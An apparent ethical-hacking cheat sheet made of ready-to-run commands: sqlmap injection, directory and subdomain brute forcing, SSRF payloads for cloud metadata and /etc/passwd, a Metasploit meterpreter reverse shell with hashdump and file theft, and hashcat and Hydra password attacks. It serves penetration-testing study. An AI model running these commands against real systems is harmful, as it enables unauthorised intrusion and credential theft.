# Ethical Hacking — Intermediate

## Web Application Testing

```bash
# OWASP ZAP — automated web scanner (free)
# Start proxy mode: java -jar zap.jar

# Passive scan (just browse, ZAP observes)
# Active scan (ZAP actively probes for vulnerabilities)

# Common manual tests:

# 1. SQL Injection detection
sqlmap -u "https://target.com/users?id=1" --dbs --batch
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --level=5 --risk=3

# 2. Directory bruteforcing
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# 3. Subdomain enumeration
subfinder -d target.com -silent
amass enum -d target.com -passive
# Find subdomains via certificate transparency:
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# 4. Parameter fuzzing (find hidden params)
ffuf -u "https://target.com/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
ffuf -u "https://target.com/user?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# 5. SSRF testing
# Try: /api/fetch?url=http://169.254.169.254/latest/meta-data/
# Try: /api/fetch?url=http://localhost/admin
# Try: /api/fetch?url=file:///etc/passwd
```

## Metasploit Framework

```bash
# Metasploit — exploitation framework
msfconsole

# Search for exploits
msf6> search type:exploit name:eternalblue
msf6> search cve:2021-44228  # Log4Shell

# Use an exploit
msf6> use exploit/multi/handler
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> set LHOST 10.10.10.1
msf6> set LPORT 4444
msf6> run

# Post-exploitation with meterpreter
meterpreter> sysinfo
meterpreter> getuid
meterpreter> hashdump        # Dump password hashes
meterpreter> getsystem       # Privilege escalation attempt
meterpreter> upload file.exe C:\\Users\\Public\\
meterpreter> download C:\\Users\\admin\\Desktop\\file.txt

# ALWAYS: Only use on systems you own or have explicit written permission
```

## Password Attacks

```bash
# Hashcat — GPU password cracking
# Dictionary attack
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Rules-based (mutate wordlist)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Brute force (short passwords only)
hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?d?d'

# Hash types: 0=MD5, 1000=NTLM, 1800=SHA-512, 3200=bcrypt, 13400=KeePass

# John the Ripper
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

# Hydra — online brute force (VERY carefully, can lock accounts)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target.com http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid credentials"
```
